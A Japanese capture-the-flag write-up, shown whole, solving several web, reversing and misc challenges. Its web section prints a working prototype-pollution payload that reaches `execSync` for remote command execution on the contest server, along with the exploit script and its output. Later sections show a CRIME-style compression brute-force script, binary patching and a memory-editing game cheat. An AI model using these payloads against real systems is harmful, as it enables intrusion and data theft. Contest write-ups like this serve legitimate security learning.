これを使えば、`/start` への POST 時に `start` に `{0: 1, 1: 1, "__proto__": {"__proto__": {"heap": "abc"}}}` というようなオブジェクトを仕込んでおくことで、`Maze` の `next` が呼び出されたときに `Object.prototype.heap` に `abc` という文字列が代入されるはずです。

さらに `heap` に空文字列を仕込んでおけば、`Solver` のコンストラクタの `if (heap) { this.heap = heap; // type of priority queue }` という処理によって `Solver` の `heap` プロパティが `undefined` になります。`solve` メソッドが呼び出されたときの `const heap = this.heap || 'BinaryHeap';` ではプロトタイプチェーンを辿っていくうちに `Object.prototype.heap` にアクセスされ、このとき `heap` に `abc` という文字列が代入されます。そして、この文字列の前後に文字列が結合されて `Function` に渡され、これが呼び出されることで RCE が実現できます。 

ただ、`deepcopy` が呼び出されるのは `Solver` の `solve` メソッドが呼び出されたあと、つまり `Function` が呼び出されたあとですから、RCE に持ち込むには `Solver` の `solve` メソッドが 2 回呼び出される必要があります。

ここで `solve.js` をもう一度見てみましょう。

```javascript
// Solve maze
var ms = new maze.Solver(map, start, goal, heap);
var result = ms.solve() !== undefined ? ms.solve() : 'impossible';
```

返り値が `undefined` でなければ、つまり迷路が解ければもう一度 `Solver` の `solve` メソッドが呼ばれています。RCE チャンス! 攻撃するスクリプトを書きましょう。

```python
import requests
import json
import sys

HOST, PORT = '(省略)', 14002

maze = {
    "map": [
        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1],
        [1, 0, 0, 0, 0, 0, 0, 0, 0, 1],
        [1, 0, 1, 1, 1, 0, 1, 1, 1, 1],
        [1, 0, 0, 0, 1, 0, 1, 0, 1, 1],
        [1, 1, 1, 0, 1, 0, 0, 0, 0, 1],
        [1, 0, 0, 0, 1, 1, 1, 1, 0, 1],
        [1, 0, 1, 1, 1, 0, 0, 0, 0, 1],
        [1, 0, 1, 0, 1, 0, 1, 1, 1, 1],
        [1, 0, 0, 0, 1, 0, 0, 1, 1, 1],
        [1, 0, 1, 0, 0, 0, 0, 0, 0, 1],
        [1, 1, 1, 1, 1, 1, 1, 1, 1, 1],
    ],
    "start": {
      0: 1,
      1: 1,
      '__proto__': {
        '__proto__': {
          'heap': "BinaryHeap({comparator:c})&&console.log(process.mainModule.require('child_process').execSync('" + sys.argv[1] + "').toString());//"
        }
      }
    },
    "goal": (8, 9),
    "heap": ""
}

r = requests.post(f"http://{HOST}:{PORT}/solve",
                  headers = {"Content-Type": "application/json"},
                  data = json.dumps(maze))
print(r.text)
```

```
$ python solve.py "ls -la /"
total 72
drwxr-xr-x    1 root     root          4096 Sep  5 15:46 .
drwxr-xr-x    1 root     root          4096 Sep  5 15:46 ..
-rwxr-xr-x    1 root     root             0 Sep  5 15:46 .dockerenv
drwxr-xr-x    1 root     node          4096 Sep  5 15:46 app
drwxr-xr-x    1 root     root          4096 Aug 28 17:22 bin
drwxr-xr-x    5 root     root           360 Sep  5 15:46 dev
drwxr-xr-x    1 root     root          4096 Sep  5 15:46 etc
-r--r--r--    1 root     root            54 Sep  5 15:46 flag-1d613b84b99ed7c9e741627cd0324fbd.txt
drwxr-xr-x    1 root     root          4096 Aug 28 17:22 home
drwxr-xr-x    1 root     root          4096 Aug 28 17:22 lib
drwxr-xr-x    5 root     root          4096 Apr 23 06:25 media
drwxr-xr-x    2 root     root          4096 Apr 23 06:25 mnt
drwxr-xr-x    1 root     root          4096 Aug 28 17:22 opt
dr-xr-xr-x  304 root     root             0 Sep  5 15:46 proc
drwx------    1 root     root          4096 Sep  5 15:46 root
drwxr-xr-x    2 root     root          4096 Apr 23 06:25 run
drwxr-xr-x    2 root     root          4096 Apr 23 06:25 sbin
drwxr-xr-x    2 root     root          4096 Apr 23 06:25 srv
dr-xr-xr-x   13 root     root             0 Sep  5 15:46 sys
drwxrwxrwt    1 root     root          4096 Sep  6 15:46 tmp
drwxr-xr-x    1 root     root          4096 Aug 28 17:22 usr
drwxr-xr-x    1 root     root          4096 Apr 23 06:25 var
$ python sample.py "cat /flag-1d613b84b99ed7c9e741627cd0324fbd.txt"
KosenCTF{g01ng_fr0m_Array_prototype_pollution_t0_RCE}
```

フラグが得られました。

```
KosenCTF{g01ng_fr0m_Array_prototype_pollution_t0_RCE}
```

## [reversing 182] harmagedon (36 solves)
> WTF of the large data!  
> Enclose the flag with KosenCTF{}
> 
> 添付ファイル: harmagedon
> 
> author: theoremoon

`harmagedon` という 5 MB 強のめっちゃデカいファイルが与えられました。どのようなファイルか `file` で確認しましょう。

```
$ file harmagedon
harmagedon: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```

x86_64 の ELF のようです。実行してみましょう。

```
$ ./harmagedon 
which is your choice? [fRD3]f
which is your choice? [H26S]2
which is your choice? [b-z-]z
which is your choice? [-YzK]K
which is your choice? [mUnI]m
which is your choice? [wbnR]b
which is your choice? [ApZ4]Z
which is your choice? [mRPo]o
which is your choice? [nGQe]n
which is your choice? [Wyaz]y
which is your choice? [N26_]6
try harder.
$ ./harmagedon 
which is your choice? [fRD3]f
which is your choice? [H26S]H
which is your choice? [93Py]9
which is your choice? [LRZu]L
which is your choice? [z1C}]z
which is your choice? [ylQC]l
which is your choice? [DaPi]D
which is your choice? [KYaf]K
which is your choice? [CAT}]C
which is your choice? [fXO_]_
which is your choice? [In9s]s
try harder.
```

4 つの文字が表示されるので、そのうち 1 つを選んでいくバイナリのようです。表示される文字はそれまでに選択した文字によって変わるようです。

`objdump` で逆アセンブルしましょう。

```
$ objdump -d -Mintel harmagedon

harmagedon:     file format elf64-x86-64


Disassembly of section .text:

00000000004000b0 <_start>:
  4000b0:       48 31 db                xor    rbx,rbx
  4000b3:       4d 31 d2                xor    r10,r10

00000000004000b6 <f>:
  4000b6:       49 ff c2                inc    r10
  4000b9:       b8 7c 7c b7 00          mov    eax,0xb77c7c
  4000be:       48 39 d8                cmp    rax,rbx
  4000c1:       0f 84 da 00 00 00       je     4001a1 <congratz>
  4000c7:       b8 0b 00 00 00          mov    eax,0xb
  4000cc:       4c 39 d0                cmp    rax,r10
  4000cf:       0f 8c e9 00 00 00       jl     4001be <goodbye>
  4000d5:       b8 01 00 00 00          mov    eax,0x1
  4000da:       bf 01 00 00 00          mov    edi,0x1
  4000df:       48 be e8 01 60 00 00    movabs rsi,0x6001e8
  4000e6:       00 00 00
  4000e9:       ba 17 00 00 00          mov    edx,0x17
  4000ee:       0f 05                   syscall
  4000f0:       b8 01 00 00 00          mov    eax,0x1
  4000f5:       bf 01 00 00 00          mov    edi,0x1
  4000fa:       48 8d b3 3f 02 60 00    lea    rsi,[rbx+0x60023f]
  400101:       ba 04 00 00 00          mov    edx,0x4
  400106:       0f 05                   syscall
  400108:       b8 01 00 00 00          mov    eax,0x1
  40010d:       bf 01 00 00 00          mov    edi,0x1
  400112:       48 be ff 01 60 00 00    movabs rsi,0x6001ff
  400119:       00 00 00
  40011c:       ba 01 00 00 00          mov    edx,0x1
  400121:       0f 05                   syscall
  400123:       b8 00 00 00 00          mov    eax,0x0
  400128:       bf 00 00 00 00          mov    edi,0x0
  40012d:       48 be 94 57 b5 00 00    movabs rsi,0xb55794
  400134:       00 00 00
  400137:       ba 02 00 00 00          mov    edx,0x2
  40013c:       0f 05                   syscall
  40013e:       8a 04 25 94 57 b5 00    mov    al,BYTE PTR ds:0xb55794
  400145:       48 31 c9                xor    rcx,rcx
  400148:       3a 84 19 3f 02 60 00    cmp    al,BYTE PTR [rcx+rbx*1+0x60023f]
  40014f:       74 41                   je     400192 <valid>
  400151:       48 ff c1                inc    rcx
  400154:       3a 84 19 3f 02 60 00    cmp    al,BYTE PTR [rcx+rbx*1+0x60023f]
  40015b:       74 35                   je     400192 <valid>
  40015d:       48 ff c1                inc    rcx
  400160:       3a 84 19 3f 02 60 00    cmp    al,BYTE PTR [rcx+rbx*1+0x60023f]
  400167:       74 29                   je     400192 <valid>
  400169:       48 ff c1                inc    rcx
  40016c:       3a 84 19 3f 02 60 00    cmp    al,BYTE PTR [rcx+rbx*1+0x60023f]
  400173:       74 1d                   je     400192 <valid>
  400175:       b8 01 00 00 00          mov    eax,0x1
  40017a:       bf 01 00 00 00          mov    edi,0x1
  40017f:       48 be 00 02 60 00 00    movabs rsi,0x600200
  400186:       00 00 00
  400189:       ba 0e 00 00 00          mov    edx,0xe
  40018e:       0f 05                   syscall
  400190:       eb 47                   jmp    4001d9 <e>

0000000000400192 <valid>:
  400192:       48 01 cb                add    rbx,rcx
  400195:       48 ff c3                inc    rbx
  400198:       48 c1 e3 02             shl    rbx,0x2
  40019c:       e9 15 ff ff ff          jmp    4000b6 <f>

00000000004001a1 <congratz>:
  4001a1:       b8 01 00 00 00          mov    eax,0x1
  4001a6:       bf 01 00 00 00          mov    edi,0x1
  4001ab:       48 be 0f 02 60 00 00    movabs rsi,0x60020f
  4001b2:       00 00 00
  4001b5:       ba 24 00 00 00          mov    edx,0x24
  4001ba:       0f 05                   syscall
  4001bc:       eb 1b                   jmp    4001d9 <e>

00000000004001be <goodbye>:
  4001be:       b8 01 00 00 00          mov    eax,0x1
  4001c3:       bf 01 00 00 00          mov    edi,0x1
  4001c8:       48 be 33 02 60 00 00    movabs rsi,0x600233
  4001cf:       00 00 00
  4001d2:       ba 0c 00 00 00          mov    edx,0xc
  4001d7:       0f 05                   syscall

00000000004001d9 <e>:
  4001d9:       bf 00 00 00 00          mov    edi,0x0
  4001de:       b8 3c 00 00 00          mov    eax,0x3c
  4001e3:       0f 05                   syscall
```

`0x60023f` は 5592504 バイトもある文字列で、表示される 4 文字は `rbx` というレジスタに入っている数値に基づいてこの文字列から選ばれていることがわかります。

`r10` レジスタはループカウンタのようで、ループは最大 11 回であることがわかります。`rbx` は選択した文字の位置によって変化し、これが `0xb77c7c` になればすべて正解の選択だったということを意味します。

Python に直すと大体以下のような感じになります。

```python
with open('harmagedon', 'rb') as f:
  f.seek(0x23f)
  buf = f.read(5592404).decode()

rbx = 0
for _ in range(11):
  chars = buf[rbx:rbx+4]
  rcx = input('which is your choice? [' + chars + ']')
  rcx = chars.index(rcx)

  rbx += rcx
  rbx += 1
  rbx <<= 2

if rbx == 0xb77c7c:
  print('congratz')
else:
  print('try harder')

print(rbx)
```

どのような操作をすると `rbx` が `0xb77c7c` になるか特定し、毎ループどの文字を選んだか出力させるプログラムを書きましょう。

```python
with open('harmagedon', 'rb') as f:
  f.seek(0x23f)
  buf = f.read(5592404).decode()

x = 0xb77c7c
choices = []
for _ in range(11):
  x >>= 2
  x -= 1
  choices.append(x & 0b11)

res = ''
rbx = 0
for rcx in choices[::-1]:
  chars = buf[rbx:rbx+4]
  res += chars[rcx]

  rbx += rcx
  rbx += 1
  rbx <<= 2

print(res)
```

```
$ python solve.py
Ruktun0rDi3
```

フラグが得られました。

```
KosenCTF{Ruktun0rDi3}
```

## [reversing 182] in question (36 solves)
> ???
> 
> 添付ファイル: chall
> 
> author: ptr-yudai

`chall` がどのようなファイルか `file` で確認しましょう。

```
$ file chall
chall: ELF 64-bit MSB *unknown arch 0x3e00* (SYSV)
```

ヘッダがぶっ壊れているようです。別の問題のバイナリと比較すると、この問題では 5 バイト目が `02` になっており、ビッグエンディアンの ELF として読まれてしまっていることがわかります。

![7F 45 4C 46 02 02](../images/2020-09-07_inquestion1.png)

これを `01` に変えると x86_64 の ELF として読むことができました。

```
$ file patched
patched: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```

これを Ghidra でデコンパイルして関数を片っ端から見ていくと、以下のように `main` らしき関数が見つかりました。

```c
ulong ????(int param_1,undefined8 *param_2)

{
  uint uVar1;
  ulong uVar2;
  
  ???????????????();
  ????????????????();
  ???????????????????();
  ?????();
  if (param_1 < 2) {
    uVar2 = 1;
    ??????("Usage: %s <FLAG>\n",*param_2);
  }
  else {
    uVar1 = ?????(param_2[1],??????);
    uVar2 = (ulong)uVar1;
    if (uVar1 == 0) {
      ????("Correct!");
    }
    else {
      uVar2 = 0;
      ????("Wrong...");
    }
  }
  return uVar2;
}
```

シンボル名が全て `?` に置き換えられてしまっています。`uVar1 = ?????(param_2[1],??????);` でコマンドライン引数を第一引数、`db e2 eb ...` というバイト列を第二引数として謎の関数に投げられており、その返り値が `0` ならば OK ということは読み取れます。この関数を見てみましょう。

```c
undefined8 ?????(byte *user_input,byte *nazo_bytes)

{
  byte *t;
  byte c;
  long lVar1;
  uint i_00;
  uint len;
  long i;
  byte *s;
  
  i = -1;
  s = user_input;
  do {
    len = (uint)i;
    if (i == 0) break;
    i = i + -1;
    len = (uint)i;
    c = *s;
    s = s + 1;
  } while (c != 0);
  i = 0;
  do {
    i_00 = (uint)i;
    if ((int)(~len - 1) <= (int)i_00) {
      return 0;
    }
    s = user_input + i;
    lVar1 = i + 1;
    t = nazo_bytes + i;
    i = i + 1;
  } while (((uint)(*s ^ user_input[lVar1]) ^ i_00 ^ 0xff) == (uint)*t);
  return 1;
}
```

単純な XOR です。デコードするプログラムを書きましょう。

```python
with open('chall', 'rb') as f:
  f.seek(0x4030)
  buf = f.read(30)

res = b'K'
for i, c in enumerate(buf):
  res += bytes([c ^ 0xff ^ i ^ res[i]])

print(res)
```

```
$ python solve.py
b'KosenCTF{d0nt_l3t_th4t_f00l_u}\x00'
```

フラグが得られました。

```
KosenCTF{d0nt_l3t_th4t_f00l_u}
```

## [reversing 252] trilemma (26 solves)
> Citizen fears emperor.  
> Slave fears citizen.  
> Emperor fears slave.
> 
> 添付ファイル: main.c, libcitizen.so, libslave.so, libemperor.so
> 
> author: ptr-yudai

どこかで見たことがあるような設定です。`main.c` は以下のような内容でした。

```c
/**
   $ gcc main.c -L./ -lemperor -lcitizen -lslave
   $ LD_LIBRARY_PATH=./ ./a.out
 */
#include <stdio.h>

char *emperor_flag(void);
char *citizen_flag(void);
char *slave_flag(void);

int main(void) {
  printf("The flag is %s%s%s\n", emperor_flag(), citizen_flag(), slave_flag());
  return 0;
}
```

コメント内のコマンドを使ってコンパイルし、実行してみましょう。

```
$ gcc main.c -L./ -lemperor -lcitizen -lslave
$ LD_LIBRARY_PATH=./ ./a.out
[libslave.so] Citizen despises slave.
```

`libslave.so` でエラーが発生したようです。なぜこのようなエラーが発生するか、Ghidra でデコンパイルして見てみましょう。`[libslave.so] Citizen despises slave.` というメッセージで探すと、`slave` という関数に以下のような処理が見つかりました。

```c
void slave(void)

{
  long in_FS_OFFSET;
  undefined8 local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = 0;
  dl_iterate_phdr(lookup,&local_18);
  if ((int)local_18 != 0) {
    fwrite("[libslave.so] Citizen despises slave.\n",1,0x26,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (local_18._4_4_ == 0) {
    fwrite("[libslave.so] Slave thirsts for rebellion.\n",1,0x2b,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

`dl_iterate_phdr` に `lookup` というコールバック関数を投げて、ロードされている共有ライブラリの情報をチェックしているようです。`lookup` を見てみましょう。

```c
undefined8 lookup(long param_1,undefined8 param_2,undefined4 *param_3)

{
  char *pcVar1;
  
  pcVar1 = strstr(*(char **)(param_1 + 8),"libcitizen.so");
  if (pcVar1 != (char *)0x0) {
    *param_3 = 1;
  }
  pcVar1 = strstr(*(char **)(param_1 + 8),"libemperor.so");
  if (pcVar1 != (char *)0x0) {
    param_3[1] = 1;
  }
  return 0;
}
```

`libcitizen.so` や `libemperor.so` がロードされているかチェックしています。

`libcitizen.so` と `libemperor.so` にも `libslave.so` の `slave` と同様に他のライブラリがロードされているかチェックしている処理がありました。3 つとも NOP で埋めて潰してしまいましょう。

今度はどうでしょうか。また実行してみましょう。

```
$ LD_LIBRARY_PATH=./ ./a.out
[libcitizen.so] Resource conflicts.
```

リソースが競合していると怒られてしまいました。`emperor_flag` `citizen_flag` `slave_flag` をそれぞれ個別に呼び出すとどうでしょうか。試してみましょう。

```
$ cat 1.c
#include <stdio.h>
char *emperor_flag(void);
int main(void) {
  puts(emperor_flag());
  return 0;
}
$ cat 2.c
#include <stdio.h>
char *citizen_flag(void);
int main(void) {
  puts(citizen_flag());
  return 0;
}
$ cat 3.c
#include <stdio.h>
char *slave_flag(void);
int main(void) {
  puts(slave_flag());
  return 0;
}
```

```
$ gcc 1.c -L./ -lemperor -lcitizen -lslave; LD_LIBRARY_PATH=./ ./a.out
KosenCTF{emperor_wi
$ gcc 2.c -L./ -lcitizen -lslave -lemperor; LD_LIBRARY_PATH=./ ./a.out
ns_with_a_probabili
$ gcc 3.c -L./ -lslave -lemperor -lcitizen; LD_LIBRARY_PATH=./ ./a.out
ty_of_four-fifths}
```

フラグが得られました。

```
KosenCTF{emperor_wins_with_a_probability_of_four-fifths}
```

## [reversing 335] stratum (16 solves)
> Would you like some millefeuille?
> 
> 添付ファイル: chall, chall.sh, flag.enc
> 
> author: ptr-yudai

`chall.sh` は以下のような内容でした。

```bash
#!/bin/bash
if [[ "$FLAG" =~ ^KosenCTF\{[-a-zA-Z0-9_!?]+\}$ ]]; then
    echo $FLAG | ./chall > flag.enc
else
    echo "Invalid flag"
fi
```

`FLAG` にフラグを入れておくと、標準入力から `chall` に投げられて何らかの処理がなされた上で `flag.enc` に書き込まれるというスクリプトのようです。`"$FLAG" =~ ^KosenCTF\{[-a-zA-Z0-9_!?]+\}$` からフラグに使われている文字種がわかります。

`chall` を実行してみましょう。

```
$ xxd flag.enc 
00000000: 636d 6668 6e66 676a 636c 676a 666d 6a68  cmfhnfgjclgjfmjh
00000010: 2f3e 2670 6659 6e06 0902 6d24 250d 380e  />&pfYn...m$%.8.
00000020: 6e6d 6b73 6b6c 6d6b 6c66 6d68 6b76 7a6d  nmksklmklfmhkvzm
00000030: 3314 566d 2704 5234 442e 3e02 180c 153e  3.Vm'.R4D.>....>
00000040: 6468 6b6d 6868 666a 6876 6d66 7a62 676d  dhkmhhfjhvmfzbgm
00000050: 003f 6756 2337 2176 6071 0f74 4c4b 2161  .?gV#7!v`q.tLK!a
00000060: 736e 686b 6468 666b 7361 6e68 6278 6161  snhkdhfksanhbxaa
00000070: 793e 3137 2f12 1514 494a 6534 527b 7665  y>17/...IJe4R{ve
$ echo AAAAAAAA | ./chall | xxd
00000000: 7373 7373 7373 7373 7861 6161 6161 6161  ssssssssxaaaaaaa
00000010: 2121 2121 2121 2121 2410 1010 1010 1010  !!!!!!!!$.......
00000020: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000030: 1010 1010 1010 1010 1010 1010 1010 1010  ................
00000040: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000050: 1010 1010 1010 1010 1010 1010 1010 1010  ................
00000060: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000070: 5151 5151 5151 5151 1a10 1010 1010 1010  QQQQQQQQ........
$ echo KosenCTF | ./chall | xxd
00000000: 636d 6668 6e66 676a 7861 6161 6161 6161  cmfhnfgjxaaaaaaa
00000010: 4161 5141 5131 3131 2410 1010 1010 1010  AaQAQ111$.......
00000020: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000030: 1010 1010 1010 1010 1010 1010 1010 1010  ................
00000040: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000050: 1010 1010 1010 1010 1010 1010 1010 1010  ................
00000060: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000070: 5b7f 6375 7e53 4456 1a10 1010 1010 1010  [.cu~SDV........
```

`flag.enc` と何文字目まで一致しているかという情報から、ブルートフォースで 1 文字ずつフラグが特定できそうな雰囲気があります。やってみましょう。

```python
import subprocess

with open('flag.enc', 'rb') as f:
    encrypted = f.read()

table = '-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!?{}'
known = 'KosenCTF{'
i = len(known)
while True:
    cands = ''
    for c in table:
        res = subprocess.check_output('echo "' + known + c + '" | ./chall', shell=True)
        if res[i] == encrypted[i]:
            cands += c
    known += cands[0]
    i += 1
    print cands, known
```

```
$ python solve.py 
8hxHX KosenCTF{8
4dtDT KosenCTF{84
6fvFV KosenCTF{846
3csCS KosenCTF{8463
oO_? KosenCTF{8463o
6fvFV KosenCTF{8463o6
5euEU KosenCTF{8463o65
n KosenCTF{8463o65n
_ KosenCTF{8463o65n_
w KosenCTF{8463o65n_w
1 KosenCTF{8463o65n_w1
7 KosenCTF{8463o65n_w17
h KosenCTF{8463o65n_w17h
_ KosenCTF{8463o65n_w17h_
...
```

最初の数文字でいくつか候補が出ています。英文っぽい組み合わせは `h4v3_fun` でしょう。

```
$ python solve.py 
_ KosenCTF{h4v3_fun_
w KosenCTF{h4v3_fun_w
1 KosenCTF{h4v3_fun_w1
7 KosenCTF{h4v3_fun_w17
h KosenCTF{h4v3_fun_w17h
_ KosenCTF{h4v3_fun_w17h_
7 KosenCTF{h4v3_fun_w17h_7
h KosenCTF{h4v3_fun_w17h_7h
3 KosenCTF{h4v3_fun_w17h_7h3
_ KosenCTF{h4v3_fun_w17h_7h3_
u KosenCTF{h4v3_fun_w17h_7h3_u
g KosenCTF{h4v3_fun_w17h_7h3_ug
l KosenCTF{h4v3_fun_w17h_7h3_ugl
y KosenCTF{h4v3_fun_w17h_7h3_ugly
_ KosenCTF{h4v3_fun_w17h_7h3_ugly_
-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!?{} KosenCTF{h4v3_fun_w17h_7h3_ugly_-
-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!?{} KosenCTF{h4v3_fun_w17h_7h3_ugly_--
-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!?{} KosenCTF{h4v3_fun_w17h_7h3_ugly_---
```

途中からコケだしました。少し実装を変えてもう一度試してみましょう。

```python
import subprocess

def compare(s, t):
    res = 0
    for a, b in zip(s, t):
        if a == b:
            res += 1
    return res

with open('flag.enc', 'rb') as f:
    encrypted = f.read()

table = '-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!?{}'
known = 'KosenCTF{h4v3_fun_w17h_7h3_ugly_'
max_c, max_l = '', 0
while True:
    for c in table:
        t = c
        res = subprocess.check_output('echo "' + known + t + '" | ./chall', shell=True)
        if compare(encrypted, res) > max_l:
            max_c, max_l = c, compare(encrypted, res)
    known += max_c
    print known
```

```
$ python solve2.py
...
KosenCTF{h4v3_fun_w17h_7h3_ugly_bu7_u53ful_SIMD_1n57ruc71
KosenCTF{h4v3_fun_w17h_7h3_ugly_bu7_u53ful_SIMD_1n57ruc710
KosenCTF{h4v3_fun_w17h_7h3_ugly_bu7_u53ful_SIMD_1n57ruc710n
KosenCTF{h4v3_fun_w17h_7h3_ugly_bu7_u53ful_SIMD_1n57ruc710n5
KosenCTF{h4v3_fun_w17h_7h3_ugly_bu7_u53ful_SIMD_1n57ruc710n5}
```

フラグが得られました。

```
KosenCTF{h4v3_fun_w17h_7h3_ugly_bu7_u53ful_SIMD_1n57ruc710n5}
```

## [misc 335] No pressure (16 solves)
> nc (問題サーバへの接続情報) 10002
> 
> 添付ファイル: chall.py
> 
> author: yoshiking

`chall.py` は以下のような内容でした。

```python
from Crypto.Cipher import ARC4
from hashlib import sha256
from base64 import b64encode
import zlib
import os

flag = open("./flag.txt", "rb").read()

nonce = os.urandom(32)
while True:
    m = input("message: ")
    arc4 = ARC4.new(sha256(nonce + m.encode()).digest())
    c = arc4.encrypt(zlib.compress(flag + m.encode()))
    print("encrypted! :", b64encode(c).decode())
```

フラグとユーザが入力した文字列を結合して Deflate で圧縮し、それをランダムに生成されるバイト列を鍵に RC4 で暗号化したものを出力するというプログラムのようです。

「フラグとユーザが入力した文字列を結合して Deflate で圧縮」という処理から思い出されるのは CRIME という、圧縮後のサイズの変化から内容を推測する攻撃手法です。

Deflate は繰り返されるバイト列があれば圧縮後のサイズが小さくなるようなアルゴリズムですから、以下のようにフラグフォーマットを利用してブルートフォースすることで、圧縮後のサイズの観察によって 1 バイトずつフラグを得ることができます。

```
$ python
>>> import zlib
>>> flag = b'KosenCTF{DUMMY}'
>>>
>>> len(zlib.compress(flag + b'KosenCTE'))
26
>>> len(zlib.compress(flag + b'KosenCTF'))
25
>>> len(zlib.compress(flag + b'KosenCTG'))
26
```

この作業を自動でやってくれるスクリプトを書きましょう。

```python
import string
import time
from pwn import *
table = string.printable.strip()

sock = connect('(省略)', 10002)
known = 'KosenCTF'

while True:
    min_l, min_c = '?', 10000
    for c in table:
        sock.recvuntil('message: ')
        sock.sendline(known + c)
        sock.recvuntil('encrypted! : ')
        res = sock.recvline()

        if len(res) < min_l:
            min_l = len(res)
            min_c = c
    known += min_c
    print known
    time.sleep(.5)
sock.close()
```

```
$ python2 solve.py
...
KosenCTF{DEFLATE_is_an_algorithm_that_combines_LZ77_and_Huffman_cod
KosenCTF{DEFLATE_is_an_algorithm_that_combines_LZ77_and_Huffman_codi
KosenCTF{DEFLATE_is_an_algorithm_that_combines_LZ77_and_Huffman_codin
KosenCTF{DEFLATE_is_an_algorithm_that_combines_LZ77_and_Huffman_coding
KosenCTF{DEFLATE_is_an_algorithm_that_combines_LZ77_and_Huffman_coding}
```

フラグが得られました。

```
KosenCTF{DEFLATE_is_an_algorithm_that_combines_LZ77_and_Huffman_coding}
```

## [misc,cheat 353] Tip Toe (14 solves)
> Fall Bozos: Ultimate KosenCTF  
> The timer is of integer type.
> 
> 添付ファイル: Tip Toe_10b3f1cdc12bc94337bdc024321728a0.tar.gz
> 
> author: ptr-yudai

与えられたファイルを展開すると、`tiptoe.exe` や `README.exe`、リソースなどのファイルが出てきました。`README.txt` には操作方法と、乗ると落ちてしまうものが混じっているタイルを抜けてゴールしろというこのゲームの目的が書かれていました。

`tiptoe.exe` を実行してみると、以下のようにどこかで見たような感じのゲームが起動されました。

![ヒヤヒヤロード](../images/2020-09-07_tiptoe1.png)

元ネタのゲームのようによく見ると落ちるタイルがわかるというわけでもなく、一度落ちるとゲームオーバー、シングルプレイなので他人を犠牲にして踏んでも構わないタイルを把握するということができずとても難しくなっています。これはチート必須でしょう。

リバースエンジニアリングによってなにか情報が得られないか試してみます。`strings` に投げてみましょう。

```
$ strings tiptoe.exe | grep hsp
gamehsp::init2DRender
gamehsp::pickupNode
gamehsp::addAnimId
gamehsp::createCubeMesh
gamehsp::startPolyTex2D
gamehsp::drawPolyTex2D
gamehsp::addPolyTex2D
gamehsp::finishPolyTex2D
gamehsp::make2DMaterialForMesh
gamehsp::makeMaterialTex2D
hsp3gp.log
hsp3dish.ini
D:\onidev\hsp3dish\win32gp\hsprt\hsp3gp.pdb
.?AVgamehsp@@
name="OnionSoftware.hsp3.exe"
```

HSP が使われていることがわかります。デコンパイルできないか `hsp exe デコンパイル` でググってみると [YSRKEN/HSP-Decompiler](https://github.com/YSRKEN/HSP-Decompiler) という便利なツールがヒットしました。これに投げてみると「コードを完全には復号できませんでした」とエラーが表示されるものの、デコンパイルされていない `start.ax` が出力されました。

出力された `start.ax` を `strings` に投げてみましょう。

```
$ strings start.ax
{% raw %}HSP3P
hsp3gp
modflag
__init
KosenCTF{%s_%s_%s_%s_%s_%s_%c%c%c}
Tamane Tip Toe
?res/text_eliminated.png
res/text_qualified.png
debug
argv[1]='debug' : debug mode activated
Developer Mode
(@(px, py, pz) = (%f, %f, %f)
(cx, cy, cz) = (%f, %f, %f)
$@(dx, dz) = (%f, %f)
animation = %d
time = %f
Let's
other
than
Tips: Finish more quickly to get the flag!
...{% endraw %}
```

フラグは得られませんでしたが、`argv[1]='debug' : debug mode activated` とおそらくコマンドライン引数に `debug` という文字列を与えるとデバッグモードが有効になるであろうことや、`Tips: Finish more quickly to get the flag!` と早くゴールしないとフラグが表示されないという情報が得られました。

`tiptoe.exe debug` でゲームを起動すると、デバッグモードが有効化されました。プレイヤーの座標や開始してからの時間といった数値が表示され、また落ちないタイルが違う色になり見やすくなっています。

![デバッグモードが有効化された](../images/2020-09-07_tiptoe2.png)

ここでもしかしてチートなしでもデバッグモードだけでフラグが得られるのではないかと考え、タイルがランダム配置であることを利用してすぐにゴールできる配置になるまでトライし続けたものの、どれだけ早くゴールしてもフラグが表示されず諦めました。もうチートしかありません。

![Tips: Finish more quickly to get the flag!](../images/2020-09-07_tiptoe3.png)

デバッグモードで起動した上で、うさみみハリケーンでプロセスにアタッチし、実行速度をめちゃくちゃ遅くしておきます。`The timer is of integer type.` というヒントから画面上に `time` として表示されている値を int として検索すると、`time` のアドレスを特定することができました。`-2147483648` のようにめちゃくちゃ小さい値に編集し、実行速度を戻してゴールするとフラグが得られました。

![KosenCTF{Let's_play_a_game_other_than_CTF}](../images/2020-09-07_tiptoe4.png)

```
KosenCTF{Let's_play_a_game_other_than_CTF}
```

## [misc 353] readme (14 solves)
> nc (問題サーバ)
> 
> 添付ファイル: server.py
> 
> author: ptr-yudai

`server.py` は以下のような内容でした。

```python
# assert the flag exists
try:
    flag = open("flag.txt", "rb")
except:
    print("[-] Report this bug to the admin.")

# help yourself :)
path = input("> ")
if 'flag.txt' in path:
    print("[-] Nope :(")
elif 'self' in path:
    print("[-] No more procfs trick :(")
elif 'dev' in path:
    print("[-] Don't touch it :(")
else:
    try:
        f = open(path, "rb")
        print(f.read(0x100))
    except:
        print("[-] Error")
```

[Beginners CTF 2020 の readme](2020-05-24-beginners-ctf-2020.html#misc-272-readme-71-solves) を思い出す問題です。

